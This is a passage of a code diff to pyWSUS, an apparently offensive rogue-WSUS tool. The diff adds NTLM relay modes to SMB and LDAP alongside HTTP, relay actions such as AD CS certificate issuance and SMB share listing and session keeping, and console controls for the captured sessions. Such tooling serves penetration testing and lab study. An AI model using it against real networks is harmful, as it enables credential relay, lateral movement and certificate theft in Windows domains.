+        f"  [dim]·[/]  [bold white]l[/][dim]: list shares[/]"
+        f"  [dim]·[/]  [bold white]x[/][dim]: close smb[/]"
+        if ntlm_mode == "relay-smb" else ""
+    )
     _console.print(
         f"  [dim]listening on[/] [cyan]{host}:{port}[/]"
         f"  [dim]·[/]  [bold white]q[/][dim]: quit[/]"
         f"  [dim]·[/]  [bold white]r[/][dim]: rotate session[/]"
-
+        f"{smb_tag}"
         f"{rotate_tag}"
     )
     _console.print()
@@ -2102,20 +2983,36 @@ def parse_args():
     ntlm = parser.add_argument_group("NTLM")
     ntlm.add_argument(
         "--ntlm-mode",
-        choices=["off", "challenge-only", "capture", "relay-http"],
+        choices=[
+            "off",
+            "challenge-only",
+            "capture",
+            "relay-http",
+            "relay-smb",
+            "relay-ldap",
+        ],
         default="off",
-        help="NTLM behavior. off = normal pyWSUS. challenge-only = stop after Type 1. capture = local Type 2/Type 3. relay-http = relay NTLM to an HTTP target.",
+        help="NTLM behavior. off = normal pyWSUS. challenge-only = stop after Type 1. capture = local Type 2/Type 3. relay-http = relay NTLM to HTTP. relay-smb = relay NTLM to SMB. relay-ldap = relay NTLM to LDAP/LDAPS.",
     )
     ntlm.add_argument(
         "--relay-target",
         default=None,
-        help="HTTP relay target, for example http://target.lab.local/protected/",
+        help="Relay target, for example http://target.lab.local/, smb://target.lab.local/, or ldap://dc.lab.local/.",
     )
     ntlm.add_argument(
         "--relay-action",
-        choices=["auth-only", "adcs-certsrv", "adcs-issue"],
+        choices=[
+            "auth-only",
+            "adcs-certsrv",
+            "adcs-issue",
+            "list-shares",
+            "keep-session",
+            "ldap-rootdse",
+            "ldap-whoami",
+            "ldap-base-search",
+        ],
         default="auth-only",
-        help="Post-auth HTTP relay action. auth-only = generic proof. adcs-certsrv = validate AD CS Web Enrollment. adcs-issue = request and save a certificate.",
+        help="Post-auth relay action. auth-only = bind proof. adcs-certsrv/adcs-issue = HTTP AD CS. list-shares/keep-session = SMB. ldap-* = read-only LDAP validation.",
     )
     ntlm.add_argument(
         "--relay-adcs-marker",
@@ -2150,6 +3047,11 @@ def parse_args():
         action="store_true",
         help="Apply the NTLM gate to GET/HEAD downloads too. Off by default to preserve normal WSUS file delivery.",
     )
+    ntlm.add_argument(
+        "--relay-preflight",
+        action="store_true",
+        help="Run an unauthenticated RootDSE preflight before accepting relay-ldap traffic.",
+    )
     return parser.parse_args()
 
 
@@ -2183,19 +3085,52 @@ def _rotate_session(executable_file, executable_name, client_address, command):
 if __name__ == '__main__':
     args = parse_args()
 
-    if args.ntlm_mode == "relay-http":
+    if args.ntlm_mode in ("relay-http", "relay-smb", "relay-ldap"):
         if not args.relay_target:
-            _console.print("[bold red][ERROR][/] --relay-target is required with --ntlm-mode relay-http")
+            _console.print(f"[bold red][ERROR][/] --relay-target is required with --ntlm-mode {args.ntlm_mode}")
             sys.exit(1)
         parsed_relay_target = urlparse(args.relay_target)
-        if parsed_relay_target.scheme not in ("http", "https") or not parsed_relay_target.hostname:
-            _console.print("[bold red][ERROR][/] --relay-target must be http:// or https://")
-            sys.exit(1)
-        if (
-            args.relay_action in ("adcs-certsrv", "adcs-issue")
-            and not parsed_relay_target.path.rstrip("/").lower().endswith("/certsrv")
-        ):
-            _console.print("[bold yellow][WARN][/] AD CS relay actions usually expect --relay-target ending in /certsrv/")
+        if args.ntlm_mode == "relay-http":
+            if parsed_relay_target.scheme not in ("http", "https") or not parsed_relay_target.hostname:
+                _console.print("[bold red][ERROR][/] --relay-target must be http:// or https://")
+                sys.exit(1)
+            if args.relay_action in (
+                "list-shares",
+                "keep-session",
+                "ldap-rootdse",
+                "ldap-whoami",
+                "ldap-base-search",
+            ):
+                _console.print(f"[bold red][ERROR][/] --relay-action {args.relay_action} does not support --ntlm-mode relay-http")
+                sys.exit(1)
+            if (
+                args.relay_action in ("adcs-certsrv", "adcs-issue")
+                and not parsed_relay_target.path.rstrip("/").lower().endswith("/certsrv")
+            ):
+                _console.print("[bold yellow][WARN][/] AD CS relay actions usually expect --relay-target ending in /certsrv/")
+        elif args.ntlm_mode == "relay-smb":
+            if parsed_relay_target.scheme != "smb" or not parsed_relay_target.hostname:
+                _console.print("[bold red][ERROR][/] --relay-target must be smb://host[:port]/ with --ntlm-mode relay-smb")
+                sys.exit(1)
+            if args.relay_action not in ("auth-only", "list-shares", "keep-session"):
+                _console.print("[bold red][ERROR][/] relay-smb supports --relay-action auth-only, list-shares, or keep-session")
+                sys.exit(1)
+        else:
+            if parsed_relay_target.scheme not in ("ldap", "ldaps") or not parsed_relay_target.hostname:
+                _console.print("[bold red][ERROR][/] --relay-target must be ldap:// or ldaps:// with --ntlm-mode relay-ldap")
+                sys.exit(1)
+            if args.relay_action not in (
+                "auth-only",
+                "ldap-rootdse",
+                "ldap-whoami",
+                "ldap-base-search",
+            ):
+                _console.print("[bold red][ERROR][/] relay-ldap supports --relay-action auth-only, ldap-rootdse, ldap-whoami, or ldap-base-search")
+                sys.exit(1)
+
+    if args.relay_preflight and args.ntlm_mode != "relay-ldap":
+        _console.print("[bold red][ERROR][/] --relay-preflight requires --ntlm-mode relay-ldap")
+        sys.exit(1)
 
     _log_level = min(args.verbose, 2)
     _log_file  = args.log_file
@@ -2236,7 +3171,7 @@ if __name__ == '__main__':
     update_handler.set_filedigest()
     update_handler.set_resources_xml(args.command)
 
-    _print_banner(args.host, args.port, args.rotate)
+    _print_banner(args.host, args.port, args.rotate, args.ntlm_mode)
 
     if _log_level >= 1:
         _console.print(
@@ -2273,6 +3208,7 @@ if __name__ == '__main__':
             args.adcs_loot_dir,
             args.ntlm_session_key,
             args.ntlm_protect_downloads,
+            args.relay_preflight,
         ),
         daemon=True
     )
@@ -2298,6 +3234,12 @@ if __name__ == '__main__':
                     _rotate_session(executable_file, executable_name,
                                     client_addr, args.command)
                     last_rotate = time.time()
+                elif key == 's':
+                    _print_smb_sessions()
+                elif key == 'l':
+                    _print_smb_session_shares()
+                elif key == 'x':
+                    _close_smb_sessions()
     except KeyboardInterrupt:
         pass
     finally:
